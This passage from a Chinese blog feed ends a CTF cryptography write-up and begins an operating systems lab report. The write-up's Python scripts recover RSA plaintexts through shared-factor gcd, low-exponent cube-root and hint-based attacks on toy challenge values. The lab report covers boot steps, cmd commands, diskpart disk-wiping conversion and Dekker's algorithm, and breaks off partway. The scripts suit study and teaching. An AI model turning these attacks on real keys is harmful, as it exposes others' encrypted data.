data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number<span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 p <span class="token operator">=</span> <span class="token number">60973413304835230363868586902004006717237117044275222095949523787438821909233</span>q <span class="token operator">=</span> <span class="token number">60973413304835230363868586902004006717237117044275222095949523787438821908819</span>e <span class="token operator">=</span> <span class="token number">65537</span>c <span class="token operator">=</span> <span class="token number">843360044490649635455345992345658516544479053731668488697835904926685148386299530843302273377684497428582758441622699787334991310590024330881454606434905</span> d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'flag&#123;crypto_1s_interesting&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-欧欧欧欧拉"><a href="#2-欧欧欧欧拉" class="headerlink" title="2.欧欧欧欧拉"></a>2.欧欧欧欧拉</h3><p><strong>方法一：</strong> </p><p>发现p，q，r均已给出，可以忽略题目中n的值，我们令n = p * q * r </p><p>然后就是正常求解 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">77708508489582208240899650131902840854815755133475819112169579073727218368043</span>q <span class="token operator">=</span> <span class="token number">115346274621041699318908577704185761162067920193040258837922665578623979014737</span>r <span class="token operator">=</span> <span class="token number">93166107981326026645441213611016470699177795686294207640877308859576453989929</span>c <span class="token operator">=</span> <span class="token number">347985024400177502137432464900798540953635460694795945231855306625760961473332840686487124095862063998154167906085538622293374268339383930561570822025993330404000443189437185443891030627628783181063490300672242012327030487902957573259843362590656890086005064250511680034244728108117012676345214617621947005352669846702858611524555358875183335220452897059852086551237875454030210006489044067322848138770597108902534895893528585191491006543670911357584958970659151927090552495978448117307851072739865139783869799508202415340492688302276117064301995204992930822769693356655071714132128172897117903997013826512429240667259726064548860744384724715228197199073875301540485927036010254145447026303876803125148732898741913665524085357027</span> <span class="token number">545745800931501381715355480791801480897</span>e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">*</span> r <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>方法二：</strong></p><p>我们也可以不更改n，利用欧拉函数的性质 </p><p>n = p ** 2 * q ** 3 * r ** 5 </p><p>phin = phi(p ** 2) * phi(q ** 3) * phi(r ** 5) = (p-1) * p * (q-1) * q * (r-1) * r**4 </p><p>exp: </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">77708508489582208240899650131902840854815755133475819112169579073727218368043</span> q <span class="token operator">=</span> <span class="token number">115346274621041699318908577704185761162067920193040258837922665578623979014737</span> r <span class="token operator">=</span> <span class="token number">93166107981326026645441213611016470699177795686294207640877308859576453989929</span> c<span class="token operator">=</span><span class="token number">347985024400177502137432464900798540953635460694795945231855306625760961473332840686487124095862063998154167906085538622293374268339383930561570822025993330404000443189437185443891030627628783181063490300672242012327030487902957573259843362590656890086005064250511680034244728108117012676345214617621947005352669846702858611524555358875183335220452897059852086551237875454030210006489044067322848138770597108902534895893528585191491006543670911357584958970659151927090552495978448117307851072739865139783869799508202415340492688302276117064301995204992930822769693356655071714132128172897117903997013826512429240667259726064548860744384724715228197199073875301540485927036010254145447026303876803125148732898741913665524085357027545745800931501381715355480791801480897</span> n <span class="token operator">=</span> <span class="token number">65048551512240621993540614202950633661842586962192652824898395688184000402795957509481722751199080903392947991398273550047341785877223668123666842324877380470794846769076657730082614690182880900631464361441076132475928747991954627503106907777376357374758381806436260187733080114319610478685015082092970829089757587587993969952452971403572518192436602517670638053566510878431768966565133874950375020522410987166924387985858892891003579542248992692799457937156750952714742294212043332149687042398627353772231567346753462916369667925107827788291811362515610771720461320487626568153215009781929374220819616329622781459299058370744879472145087090461481538486760169932577206734789444604559973471107786087166188418189039013657392095931298017769281949143411358392051565393109553</span> e <span class="token operator">=</span> <span class="token number">65537</span> <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 phip <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> p phiq <span class="token operator">=</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> q<span class="token operator">**</span><span class="token number">2</span> phir <span class="token operator">=</span> <span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> r<span class="token operator">**</span><span class="token number">4</span> phi <span class="token operator">=</span> phip <span class="token operator">*</span> phiq <span class="token operator">*</span> phir d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#b'flag&#123;1_th1nk_you_get_1t&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-RRRRSA"><a href="#3-RRRRSA" class="headerlink" title="3.RRRRSA"></a>3.RRRRSA</h3><p>第一段flag对N和N1 gcd可得到p，进而得到q，e进行遍历即可。 </p><p>第二段flag为低质数加密攻击，e=3确定，爆破即可。 </p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">import</span> gmpy2 N<span class="token operator">=</span><span class="token number">8833009455505830765576231622072241161470401197695529677335107109810339880276832871604743644707359887179405543235721188241122566162151923510929667953122181</span> N1<span class="token operator">=</span><span class="token number">9429676793030563745207076251618678117488728061107610987225993751644166892153001760951206447627482758551907039606942492875805463671257287080808106906001851</span> c1<span class="token operator">=</span><span class="token number">8037069184897987958374773499995275921812115255860632996217845099273168646686370835196595250846074845406069858745424656055726674434603985267158502329518751</span> c2<span class="token operator">=</span><span class="token number">413575070955891267004255576879221041256089460651441473637</span> p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>N<span class="token punctuation">,</span>N1<span class="token punctuation">)</span> q <span class="token operator">=</span> N <span class="token operator">//</span> p phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#第一段flag枚举e </span><span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span><span class="token punctuation">(</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span>         m1 <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N<span class="token punctuation">)</span>         <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> long_to_bytes<span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            flag1 <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m1<span class="token punctuation">)</span>             <span class="token keyword">break</span> <span class="token comment">#第二段flag低公钥e爆破 </span><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> iroot <span class="token keyword">import</span> libnum e <span class="token operator">=</span> <span class="token number">0x3</span> n <span class="token operator">=</span><span class="token number">10456335904838169914349646852830082932152130624533179855437700729986430916359910968035371355128152016750075271161129744979254605922991030753616570849211931989112941277121682363790710646503345520505931418350219098036569932546893477983585713668853372819392130314661542626399462820378837771792293945490048339575869129479058678981790418112887403292721775644533540769467889512773382494878291574262142755186374570245813695390664702262226281601456889176191920270658811753696081082528539263191477192236336112147705564796435800152614366113854349615104191052807647128834113146535639155857819697492608839941056356828288393881491</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>     res <span class="token operator">=</span> iroot<span class="token punctuation">(</span>c2 <span class="token operator">+</span> k <span class="token operator">*</span> n<span class="token punctuation">,</span> e<span class="token punctuation">)</span> <span class="token comment"># c+k*n 开3次方根 能开3次方即可 </span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         flag2 <span class="token operator">=</span> libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 转为字符串 </span>        <span class="token keyword">break</span>     k <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag1 <span class="token operator">+</span> flag2<span class="token punctuation">)</span> <span class="token comment">#e = 6709 </span><span class="token comment">#flag = b'flag&#123;you_get_1t!&#125;'exp: </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-HardRSA"><a href="#4-HardRSA" class="headerlink" title="4.HardRSA"></a>4.HardRSA</h3><p>给了hint和p，q的关系，同时又知道n，我们需要构造一个p或者q的倍数和n进行最大公约，得到p或者 </p><p>q。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span> n <span class="token operator">=</span> <span class="token number">124993585424296591093467762244475251138759316583406117657133238536553852339669769400523449633693296145543303393465079699542574868451705092731269012710274047742582156286940702286646643111975860760853620625924935057792931203893647049496628704891431372213711245207398212732529309490088729910948745640748736955073</span> c <span class="token operator">=</span> <span class="token number">50424006770352436334712623677416186679749743823334436526623823505393135268471235757954106626248672896094704432397859493914371835003999982028550123956410656701321293836439453483634735255591270239182001956026055818185575266979363172614844927196934018068753541437103088119691563904347098094997053933889342339430</span> hint <span class="token operator">=</span><span class="token number">95947821330255050044792695953225981695564565853431169112620146574854785547870212826519391606210465121248955917602550813434927609689055640312953524952635919431672688325438812967089917271116316877318959974024993544935124710051420914708812538221556136784742855036819112563084588872068036526345880570488594712154</span> e <span class="token operator">=</span> <span class="token number">65537</span> kp <span class="token operator">=</span> hint<span class="token operator">-</span>gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span><span class="token number">1011</span><span class="token punctuation">,</span>n<span class="token punctuation">,</span>n<span class="token punctuation">)</span> p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n<span class="token punctuation">,</span>kp<span class="token punctuation">)</span> q <span class="token operator">=</span> n <span class="token operator">//</span> p phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span> flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#b'flag&#123;math_1s_important&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-古典密码"><a href="#5-古典密码" class="headerlink" title="5.古典密码"></a>5.古典密码</h3><p><strong>猪圈密码</strong> ,<strong>圣堂武士密码</strong> ,<strong>标准银河字母</strong>解出来 FGCPFLIRTUASYON </p><p>最后提示说栅栏,那就栅栏解密,分栏为3时解出来 FLAGISCRYPTOFUN </p><p>flag{CRYPTOFUN}</p><h2 id="3-WEB"><a href="#3-WEB" class="headerlink" title="3.WEB"></a>3.WEB</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统实验报告</title>
      <link href="/2022/03/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
      <url>/2022/03/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="实验一-OS启动过程、进程的概念及cmd-exe中的命令等"><a href="#实验一-OS启动过程、进程的概念及cmd-exe中的命令等" class="headerlink" title="实验一  OS启动过程、进程的概念及cmd.exe中的命令等"></a>实验一  OS启动过程、进程的概念及cmd.exe中的命令等</h2><p>1、 实验目的</p><ol><li>了解计算机启动过程的原理。<ul><li>CPU 加电后运行 BIOS 程序</li><li>BIOS 进行自检和初始化</li><li>BIOS 将磁盘引导扇区（MBR）加载到内存中</li><li>跳转执行引导程序BOOT，boot.bin</li><li>引导程序将Loader.bin加载到内存中</li><li>跳转执行加载程序</li><li>加载程序将Kernel.dll加载到内存中，并进入保护模式、启动分页机制（扩展内存可用），创建初始进程。</li><li>调用内核入口点，开始执行内核，进入桌面</li><li>explorer.exe</li></ul></li><li>计算机程序运行的机制</li><li>程序以进程的形式进入内存。</li><li>一般指令运行的过程：</li><li>取指周期：PC中存放现行指令的地址，该地址送到MAR并送至地址总线，由控制部件CU向存储器发出读命令，使对应MAR所指单元的内容（指令）经数据总线送至MDR，再送至IR，并由CU控制PC内容加1，形成下一条指令的地址。</li><li>中断周期：CU把保存程序断点的内存地址送到MAR，并送到地址总线上，由CU向存储器发出写命令，并PC的内容（程序断点）送到MDR，经数据总线存入存储器。CU还将中断服务程序的入口地址送到PC，为下一个指令周期的取指做准备。</li><li>创建进程、撤销进程原语程序fork()、exec()和exit()CreateProcess()和ExitProcess()</li></ol><p>2、实验时间：2学时，分两次</p><p>3、实验任务：</p><ul><li>百度fork()、exec()和exit()源程序，写出它们的功能。</li><li>验证：通过启动任务管理器（WIN+R-taskmgr,ctrl+shift+esc和ctrl+alt+delete）运行和撤销资源管理器：explorer.exe</li><li>了解cmd.exe所拥有的内部和外部命令。通过WIN+R运行了解功能，简写几个命令！</li><li>了解任务管理器中显示的当前运行的各个进程。了解它们的功能，简写几个进程！</li><li>验证命令解释程序的运行。</li><li>练习如何把U盘或移动硬盘的MBR分区转换成GPT分区。写出命令行。</li></ul><p>4、实验过程：</p><h3 id="实验一：百度fork-、exec-和exit-源程序，写出它们的功能"><a href="#实验一：百度fork-、exec-和exit-源程序，写出它们的功能" class="headerlink" title="实验一：百度fork()、exec()和exit()源程序，写出它们的功能"></a>实验一：百度fork()、exec()和exit()源程序，写出它们的功能</h3><blockquote><p>Fork()：一个进程,包括代码、数据和分配给进程的资源。fork()函数通过系统调用创建一个与原来进程几乎完全相同的进程,也就是两个进程可以做完全相同的事,但如果初始参数或者传入的变量不同,两个进程也可以做不同的事。 一个进程调用fork()函数后,系统先给新的进程分配资源,例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中,只有少数值与原来的进程的值不同。相当于克隆了一个自己。</p></blockquote><p>Exec()：exec有两个功能：</p><ol><li><p>取代当前的shell,通过给出的命令程序。即命令执行完成后，会退出本shell。</p><p>比如：exec ls</p><p>在shell中执行ls，ls结束后不返回原来的shell中。</p></li><li><p>文件重定向，可以将文件的重定向看作是是shell程序的文件重定向 比如：比如 exec 5&lt;/dev/null;exec 5&lt;&amp;-</p><p>exec 3&gt;file 将写入fd3中的内容写入到file中</p><p>exec 5&lt;file    将file读入到fd5中</p><p>exec 5&lt;&amp;-     关闭fd5</p></li></ol><p>最后发现当前脚本中exec的功能是执行完spark的启动脚本后，就退出shell,所以导致脚本后面的的两个命令都没有执行,结尾用echo输出也没有任何内容打印。</p><p>最后的解决方法是删除exec，文件就可以正常打印了。</p><p>Exit()：0表示正常退出其他表示非正常一般用-1表示</p><p>使用 exit函数，要包含头文件” stdlib.h”。。使用exit（）时，可以不论main（）的返回类型。</p><h3 id="实验二：通过启动任务管理器运行和撤销资源管理器"><a href="#实验二：通过启动任务管理器运行和撤销资源管理器" class="headerlink" title="实验二：通过启动任务管理器运行和撤销资源管理器"></a>实验二：通过启动任务管理器运行和撤销资源管理器</h3><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/03/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/1.jpg" style="zoom: 80%;" /></center> <h3 id="实验三：了解cmd-exe所拥有的内部和外部命令"><a href="#实验三：了解cmd-exe所拥有的内部和外部命令" class="headerlink" title="实验三：了解cmd.exe所拥有的内部和外部命令"></a>实验三：了解cmd.exe所拥有的内部和外部命令</h3><p>内部命令：我们可以直接在cmd下就可以执行的命令，例如：telnet、ftp、cd、等等，你可以在CMD下输入help进行查看</p><p>外部命令：就是cmd下不能直接运行的命令，（例如大家常用的nc）他需要在CMD下切换到他（NC）所在的目录你才能运行NC及NC的命令</p><center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/03/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2.jpg" alt="img"  /> </center><center> <center><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/03/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/3.jpg"  /></center><center>windows资源管理器：</center><p><strong>屏幕上显示的东西除了文件数据之外的全都算是资源管理器，资源管理器分为2个概念，一个是可见的，如“我的电脑”打开之后看到的是文件目录，一种是后台管理，如“任务管理器”是用来管理系统内核拖管的程序进程，而这些都被称为是系统资源，管理它们的就是资源管理器了。</strong></p><h3 id="实验四：-了解任务管理器中显示的当前运行的各个进程"><a href="#实验四：-了解任务管理器中显示的当前运行的各个进程" class="headerlink" title="实验四： 了解任务管理器中显示的当前运行的各个进程"></a>实验四： 了解任务管理器中显示的当前运行的各个进程</h3><p>火绒安全软件弹窗拦截程序：</p><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/03/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/4.jpg"  /> <p>应用程序 拦截广告的</p><p>Csrss: windows 的核心进程之一。</p><p>Idle：任务管理器看到显示99%占用率 表示目前还有99%的性能等待你使用。</p><p>转换分区的方法练习：</p><p>方法一：convert（文件系统修改命令）</p><p>语法：convert [Volume] /fs:ntfs </p><p>Convert将文件分配表 (FAT) 和 FAT32 卷转换为 NTFS 文件系统，而现有的文件和文件夹完好无损。被转换为 NTFS 文件系统的卷无法再转换回 FAT 或 FAT32。</p><p>方法二：</p><pre class="line-numbers language-none"><code class="language-none">1. cmd2. diskpart3. listdisk4. select disk&#x3D;*5. clean6. convert GPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会出现异常情况：除C，其他分区都显示不出来了。</p><p>解决方法 ：重启</p><p>​     运行：diskmgmt.msc</p><h3 id="实验五-验证命令解释程序的运行"><a href="#实验五-验证命令解释程序的运行" class="headerlink" title="实验五 : 验证命令解释程序的运行"></a>实验五 : 验证命令解释程序的运行</h3><p>附一个命令解释程序的源程序：</p><p><strong>一个命令解释程序：</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;stdio.h&gt;#include&lt;string.h&gt;void main()&#123;    char mingling[15][15]&#x3D; &#123;&quot;dir&quot;,&quot;cd&quot;,&quot;md&quot;,&quot;rd&quot;,&quot;cls&quot;,&quot;date&quot;,&quot;time&quot;,&quot;ren&quot;,&quot;cope&quot;,&quot;help&quot;,&quot;quit&quot;&#125;;    char ch[15];    printf(&quot;Microsoft Windows XP [版本 5.1.2600]\n&quot;);    printf(&quot;&lt;c&gt; 版权所有 1985-2001 Microsoft Corp.\n&quot;);    printf(&quot;\nc:\\Users\\Administrator&gt;&quot;);    while(1)    &#123;        gets(ch);&#x2F;&#x2F;读入字符串        if(strcmp(ch,mingling[0])&#x3D;&#x3D;0)        &#123;            printf(&quot;dir  内部命令 显示一个目录中的文件和子目录\n&quot;);        &#125;        else if(strcmp(ch,mingling[1])&#x3D;&#x3D;0)        &#123;            printf(&quot;cd 内部命令 显示当前目录的名称或将其更改。\n&quot;);        &#125;        else if(strcmp(ch,mingling[2])&#x3D;&#x3D;0)        &#123;            printf(&quot;md 内部命令 创建一个目录。\n&quot;);        &#125;        else if(strcmp(ch,mingling[3])&#x3D;&#x3D;0)        &#123;            printf(&quot;rd 内部命令 删除目录。\n&quot;);        &#125;        else if(strcmp(ch,mingling[4])&#x3D;&#x3D;0)        &#123;            printf(&quot;cls 内部命令 清除屏幕\n&quot;);        &#125;        else if(strcmp(ch,mingling[5])&#x3D;&#x3D;0)        &#123;            printf(&quot;date 内部命令 显示或设置日期\n&quot;);        &#125;        else if(strcmp(ch,mingling[6])&#x3D;&#x3D;0)        &#123;            printf(&quot;time 内部命令 内部命令显示或设置系统时间\n&quot;);        &#125;        else if(strcmp(ch,mingling[7])&#x3D;&#x3D;0)        &#123;            printf(&quot;ren 内部命令 重新命名文件\n&quot;);        &#125;        else if(strcmp(ch,mingling[8])&#x3D;&#x3D;0)        &#123;            printf(&quot;cope 内部命令 将至少一个文件复制到另一个位置\n&quot;);        &#125;        else if(strcmp(ch,mingling[9])&#x3D;&#x3D;0)        &#123;            printf(&quot;dir 内部命令 显示一个目录中的文件和子目录\n&quot;);            printf(&quot;cd 内部命令 显示当前目录的名称或将其更改。\n&quot;);            printf(&quot;md 内部命令 创建一个目录。\n&quot;);            printf(&quot;rd 内部命令 删除目录。\n&quot;);            printf(&quot;cls 内部命令 清除屏幕\n&quot;);            printf(&quot;date 内部命令 显示或设置日期\n&quot;);            printf(&quot;time 内部命令 内部命令显示或设置系统时间\n&quot;);            printf(&quot;ren 内部命令 重新命名文件\n&quot;);            printf(&quot;cope 内部命令 将至少一个文件复制到另一个位置\n&quot;);            printf(&quot;help 外部命令 提供Windows命令的帮助信息\n&quot;);            printf(&quot;quit 外部命令 退出命令解释程序\n&quot;);        &#125;        else if(strcmp(ch,mingling[10])&#x3D;&#x3D;0)            return;        else        &#123;            printf(&quot;你输入错误的信息，请重新输入：\n&quot;);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实验六：练习如何把U盘或移动硬盘的MBR分区转换成GPT分区"><a href="#实验六：练习如何把U盘或移动硬盘的MBR分区转换成GPT分区" class="headerlink" title="实验六：练习如何把U盘或移动硬盘的MBR分区转换成GPT分区"></a>实验六：练习如何把U盘或移动硬盘的MBR分区转换成GPT分区</h3><ol><li>diskpart（启动Diskpart程序)</li><li>list disk （查看电脑中有哪些磁盘）</li><li>select disk 0（选中编号为0的磁盘）</li><li>clean（清除磁盘所有分区）</li><li>convert gpt（将磁盘转换成GPT格式）</li><li>list partition（查看当前磁盘分区情况）</li><li>create partition efi size=100（默认大小为M）</li><li>create partition msr size =128</li><li>create partition primary size =102400(此处为你想设置C盘的大小)</li><li>两次输入exit </li></ol><h2 id="实验二-P、V算法"><a href="#实验二-P、V算法" class="headerlink" title="实验二  P、V算法"></a>实验二  P、V算法</h2><p>1、 实验目的</p><p>一、 Dekker算法</p><p>设有进程P0和P1，两者谁要访问临界区，就让对应的flag=true（例如P0要访问临界区，就让flag[0]=true），相当于“举手示意我要访问”。初始值为0表示一开始没人要访问</p><p>turn用于标识当前允许谁进入，turn=0则P0可进入，turn=1则P1可进入。</p><p>二、 Peterson算法：</p><p>Peterson算法是一个实现<a href="https://baike.baidu.com/item/%E4%BA%92%E6%96%A5%E9%94%81/841823">互斥锁</a>的并发程序设计算法，可以控制两个<a href="https://baike.baidu.com/item/%E7%BA%BF%E7%A8%8B/103101">线程</a>访问一个共享的单用户资源而不发生访问冲突。Gary L. Peterson于1981年提出此算法</p><p>三、生产者和消费者问题。</p><p>（1）加深对进程概念的理解，明确进程和程序的区别。</p><p>（2）进一步理解同步关系的含义。</p><p>（3）验证用信号量机制实现进程互斥的方法。</p><p>（4） 验证用信号机制实现进程同步的方法。</p><p>四、 读者和写者算法</p><p>（1） 写者优先</p><p>（2） 读者优先</p><p>  五、哲学家就餐算法</p><p>六、验证参考程序</p><p>七、 编写自己的程序</p><p>2、实验时间：4学时（2次）</p><p>3、实验任务：</p><p>（1）验证参考程序Java，观察程序运行的结果，理解信号量的作用，从运行结果中体现出三种同步情况。</p><p>（2）实现方法：多进程实现和多线程实现</p><p>（3）编写自己的程序（可用其他语言编写）</p><p>4、实验过程：</p><h3 id="一、Dekker算法"><a href="#一、Dekker算法" class="headerlink" title="一、Dekker算法"></a>一、Dekker算法</h3><h4 id="P0的逻辑"><a href="#P0的逻辑" class="headerlink" title="P0的逻辑"></a>P0的逻辑</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">do&#123;  flag[0] &#x3D; true;&#x2F;&#x2F; 首先P0举手示意我要访问  while(flag[1])  